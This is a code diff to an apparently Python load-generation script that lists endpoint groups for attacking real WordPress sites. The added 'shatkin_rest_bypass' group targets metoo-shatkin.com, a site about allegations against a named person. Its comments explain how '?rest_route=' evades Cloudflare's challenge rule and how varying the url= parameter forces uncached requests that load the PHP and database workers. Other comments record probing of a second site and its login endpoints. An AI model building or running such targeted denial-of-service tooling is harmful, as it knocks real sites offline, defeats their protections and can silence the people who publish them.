@@ -103,6 +103,27 @@ ENDPOINT_SETS = {
                      "/page/2/", "/page/3/", "/page/4/", "/page/5/",
                      "/page/6/", "/page/7/", "/page/8/", "/page/9/",
                      "/page/10/", "/page/11/"],
+    # shatkin REST bypass — discovered 2026-11-10 probe round 3/4.
+    # ?rest_route= reaches the WP REST API without triggering CF's /wp-json/* Managed Challenge rule.
+    # oEmbed: 47.8KB MISS each; url= param varies the cache key so every request is unique.
+    # media&_embed=1: 47.6KB MISS; pages&_embed=1: 38.5KB MISS — all hit PHP + DB workers.
+    "shatkin_rest_bypass": [
+        # oEmbed — 47.8KB MISS, vary url= for unique cache keys
+        "/?oembed=1&url=https://metoo-shatkin.com/dentist-todd-shatkins-history-of-stalking/&format=json",
+        "/?oembed=1&url=https://metoo-shatkin.com/?p=1&format=json",
+        "/?oembed=1&url=https://metoo-shatkin.com/?p=30&format=json",
+        "/?oembed=1&url=https://metoo-shatkin.com/&format=json",
+        "/?oembed=1&url=https://metoo-shatkin.com/page/2/&format=json",
+        "/?oembed=1&url=https://metoo-shatkin.com/dentist-todd-shatkins-history-of-stalking/&format=xml",
+        # REST bypass via ?rest_route= — bypasses CF Managed Challenge on /wp-json/*
+        "/?rest_route=/wp/v2/media&_embed=1",        # 47.6KB MISS
+        "/?rest_route=/wp/v2/pages&_embed=1",         # 38.5KB MISS
+        "/?rest_route=/wp/v2/pages&per_page=100",     # 36.5KB MISS
+        "/?rest_route=/wp/v2/media&per_page=100",     # 28.5KB MISS
+        "/?rest_route=/wp/v2/posts&_embed=1",         # 14.3KB MISS
+        "/?rest_route=/wp/v2/posts&per_page=100",     #  9.2KB MISS
+        "/?rest_route=/wp/v2/categories&per_page=100", # 5.0KB MISS
+    ],
     # buffalo: /feed/ and /comments/feed/ now 301→home (closed); removed 2026-11-10 probe.
     # /post-sitemap.xml → 404, /category-sitemap.xml → 404 on buffalo.
     "buffalo": ["/", "/sitemap_index.xml",
@@ -245,7 +266,7 @@ def main():
     ap.add_argument("--endpoints",   nargs="+",
                     choices=list(ENDPOINT_SETS.keys()) + ["all"],
                     default=["all"],
-                    help="endpoint groups: feed sitemap home shatkin shatkin_open shatkin_dynamic login_only lostpassword users heartbeat buffalo woo all")
+                    help="endpoint groups: feed sitemap home shatkin shatkin_open shatkin_dynamic shatkin_rest_bypass login_only lostpassword users heartbeat buffalo woo all")
     args = ap.parse_args()
 
     global _endpoints
